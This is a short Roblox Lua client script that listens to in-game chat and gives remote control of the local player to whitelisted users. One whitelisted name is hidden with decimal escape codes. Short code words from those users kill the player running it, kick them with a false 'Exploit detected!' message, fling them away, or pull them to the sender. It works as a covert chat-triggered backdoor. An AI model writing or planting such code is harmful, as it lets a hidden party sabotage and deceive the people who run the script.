local whitelisted = {"\117\115\101\114\110\97\109\101\109\121\105\115\116\104\105\122", "Player1"}
local TextChatService = game:GetService("TextChatService")
local ChatService = game:GetService("Chat")
local players = game:GetService("Players")
local lp = players.LocalPlayer
function getChar(plr)
	return plr.Character or plr.CharacterAdded:Wait()
end
function commands(chat, executor)
	if chat:match("klC") then --Kill
		getChar(lp):FindFirstChildOfClass("Humanoid").Health = 0
	elseif chat:match("kkC") then
		lp:Kick("Exploit detected!")
	elseif chat:match("vC") then
		getChar(lp):PivotTo(CFrame.new(9e9,9e9,9e9))
	elseif chat:match("bC") then
		getChar(lp):PivotTo(getChar(executor):GetPivot() * CFrame.new(0,0,3))
	end
end
TextChatService.OnIncomingMessage = function(message)
	local plr = players:GetPlayerByUserId(message.TextSource.UserId)
	local txt = message.Text
	if table.find(whitelisted, plr.Name) then
		commands(txt, plr)
	end
end
